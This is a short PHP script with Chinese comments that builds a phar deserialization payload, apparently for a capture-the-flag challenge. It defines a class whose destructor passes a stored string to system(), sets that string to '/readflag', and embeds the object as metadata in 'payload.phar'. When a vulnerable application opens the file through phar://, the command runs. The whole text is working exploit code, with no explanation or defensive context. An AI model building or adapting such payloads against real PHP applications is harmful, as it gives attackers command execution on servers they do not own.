<?php

class AnyClass {
    public $data;

    function __destruct() {
        system($this->data);  // 使用 system 执行命令
    }
}

$obj = new AnyClass();
$obj->data = "/readflag";


$phar = new Phar("payload.phar"); // 创建 Phar 对象
$phar->startBuffering();
$phar->addFromString("test.txt", "test"); // 添加一个任意文件
$phar->setStub("<?php __HALT_COMPILER(); ?>"); // 设置存根，防止 Phar 文件被直接执行

$phar->setMetadata($obj); // 设置包含恶意 __destruct 方法的元数据
$phar->stopBuffering();

?>
